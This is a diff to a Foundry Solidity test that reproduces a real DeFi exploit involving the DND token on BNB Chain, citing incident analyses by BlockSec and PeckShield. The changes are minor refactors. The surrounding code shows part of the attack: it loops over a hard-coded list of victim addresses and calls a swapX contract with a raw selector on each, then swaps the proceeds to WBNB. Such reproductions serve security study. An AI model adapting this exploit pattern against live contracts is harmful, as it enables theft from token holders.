@@ -3,6 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1630111965942018049
 // https://twitter.com/peckshield/status/1630100506319413250
@@ -15,7 +18,7 @@ contract ContractTest is Test {
     IERC20 DND = IERC20(0x34EA3F7162E6f6Ed16bD171267eC180fD5c848da);
     IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IUniswapV2Router Router = IUniswapV2Router(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8));
     address[] victims = [
         0x0b70e2Abe6F1A056E23658aED1FF9EF9901CB2A3,
         0x210C9E1d9E0572da30B2b8b9ca57E5e380528534,
@@ -60,7 +63,8 @@ contract ContractTest is Test {
             uint24[] memory array = new uint24[](16);
             array[0] = 65_536;
             array[11] = 257;
-            swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));
+            (bool success3,) =
+                swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));
         }
 
         DNDToWBNB();
